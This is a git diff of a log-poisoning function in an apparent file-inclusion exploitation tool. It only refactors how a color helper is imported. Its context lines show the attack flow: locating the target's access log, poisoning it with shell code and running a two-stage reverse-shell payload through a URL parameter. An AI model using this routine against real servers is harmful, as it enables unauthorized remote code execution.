@@ -5,7 +5,7 @@ import threading
 from src.utils.arguments import init_args
 from src.httpreqs import request
 from src.configs import config
-from src.utils import colors
+from src.utils.colors import Colors
 from src.utils.info import printFancyString
 from src.utils.info import printInfo
 from src.servers.LFIshell import start_listener
@@ -25,7 +25,7 @@ def exploit_log_poison(
         args['scriptDirectory'] + os.sep + "src/wordlists/http_access_log.txt"
     ):
         print(
-            colors.Colors().red("[-]")
+            Colors().red("[-]")
             + " Cannot locate '"
             + args['scriptDirectory']
             + os.sep
@@ -37,7 +37,7 @@ def exploit_log_poison(
 
     with open(args['scriptDirectory'] + os.sep + "src/wordlists/http_access_log.txt", "r", encoding="latin1") as f:
         print(
-            colors.Colors().green("[i]")
+            Colors().green("[i]")
             + " Enumerating file system to discover access log location...", flush = True
         )
         lines = f.readlines()
@@ -73,7 +73,7 @@ def exploit_log_poison(
                 lastPrintedStringLen = printFancyString("", lastPrintedStringLen)
                 print(
                     "\n"
-                    + colors.Colors().green("[.]")
+                    + Colors().green("[.]")
                     + " Located canary in target's access log at '"
                     + line
                     + "'",
@@ -81,7 +81,7 @@ def exploit_log_poison(
                 )
 
                 print(
-                    colors.Colors().green("[.]")
+                    Colors().green("[.]")
                     + " Poisoning access log with the shell code... ",
                     flush = True
                 )
@@ -153,7 +153,7 @@ def exploit_log_poison(
 
                     if config.tempArg in post:
                         print(
-                            colors.Colors().green("[.]")
+                            Colors().green("[.]")
                             + " Executing stage 1 of the revshell payload...",
                             flush = True
                         )
@@ -169,7 +169,7 @@ def exploit_log_poison(
 
                         if payloadStageTwo != "":
                             print(
-                                colors.Colors().green("[.]")
+                                Colors().green("[.]")
                                 + " Executing stage 2 of the revshell payload...",
                                 flush = True
                             )
@@ -190,7 +190,7 @@ def exploit_log_poison(
                             url.replace(config.tempArg, line) + "&c=" + payloadStageOne
                         )
                         print(
-                            colors.Colors().green("[.]")
+                            Colors().green("[.]")
                             + " Executing stage 1 of the revshell payload...",
                             flush = True
                         )
@@ -211,7 +211,7 @@ def exploit_log_poison(
                                 + payloadStageTwo
                             )
                             print(
-                                colors.Colors().green("[.]")
+                                Colors().green("[.]")
                                 + " Executing stage 2 of the revshell payload. Check your listener...",
                                 flush = True
                             )
@@ -233,7 +233,7 @@ def exploit_log_poison(
             # lastPrintedStringLen = printFancyString("", lastPrintedStringLen)
             if args['verbose']:
                 printFancyString(
-                    colors.Colors().red("[-]")
+                    Colors().red("[-]")
                     + " Couldn't locate target server's access log to poison/log is not readable.\n",
                     lastPrintedStringLen,
                 )
